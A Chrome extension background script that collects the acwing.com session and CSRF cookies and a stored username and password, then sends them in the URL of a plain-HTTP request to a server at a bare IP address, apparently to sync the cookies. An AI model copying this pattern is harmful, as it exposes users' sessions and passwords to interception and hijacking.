import {http} from './http.js';

chrome.runtime.onMessage.addListener(
    (request, sender, sendResponse) => {
        if(request.url!=='https://www.acwing.com/problem/'){
            sendResponse('error');
            return true;
        }
        chrome.cookies.getAll({
            url: request.url
        }, (cks) => {
            if(cks.length===1){
                sendResponse('error');
                return true;
            }
            let csrftoken='',sessionid='';
            let cookie1 = cks.map((item) => {
                if(item.name==='csrftoken'){
                    csrftoken=item.name+"="+item.value
                }
                if(item.name==='sessionid'){
                    sessionid=item.name+"="+item.value;
                }
            });
            let cookie = csrftoken+'分'+sessionid;
            if(csrftoken===''||sessionid==='') {
                sendResponse('error');
                return true;
            }
            let username, password;
            chrome.storage.local.get(['username','password'], function (items) {
                username = items.username;
                password = items.password;
                if (username === undefined) {
                    return true;
                } else {
                    http.get({url: 'http://101.43.175.73:8080/api/updatecookie/' + username + '/' + password + '/' + cookie});
                    return true;
                }
            });
            sendResponse("更新成功");
            return true;
        });
        return true;
    });
